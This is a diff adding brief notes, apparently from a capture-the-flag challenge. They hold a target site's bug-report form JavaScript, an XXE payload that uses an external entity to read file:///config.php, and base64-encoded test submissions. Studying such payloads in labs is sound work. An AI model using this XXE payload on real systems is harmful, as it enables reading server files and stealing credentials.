@@ -1,0 +1,40 @@
+form code
+
+function returnSecret(data) {
+	return Promise.resolve($.ajax({
+            type: "POST",
+            data: {"data":data},
+            url: "tracker_diRbPr00f314.php"
+            }));
+}
+
+async function bountySubmit() {
+	try {
+		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<bugreport>
+		<title>${$('#exploitTitle').val()}</title>
+		<cwe>${$('#cwe').val()}</cwe>
+		<cvss>${$('#cvss').val()}</cvss>
+		<reward>${$('#reward').val()}</reward>
+		</bugreport>`
+		let data = await returnSecret(btoa(xml));
+  		$("#return").html(data)
+	}
+	catch(error) {
+		console.log('Error:', error);
+	}
+}
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///config.php"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>qsdqs</cwe>
+		<cvss>200</cvss>
+		<reward>100000</reward>
+		</bugreport>
+
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5raGlyb3U8L3RpdGxlPgoJCTxjd2U%2Ba2hpcm91PC9jd2U%2BCgkJPGN2c3M%2Ba2hpcm91PC9jdnNzPgoJCTxyZXdhcmQ%2Ba2hpcm91PC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
+
+
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5raGlyb3U8L3RpdGxlPgoJCTxjd2U+a2hpcm91PC9jd2U+CgkJPGN2c3M+a2hpcm91PC9jdnNzPgoJCTxyZXdhcmQ+a2hpcm91PC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+
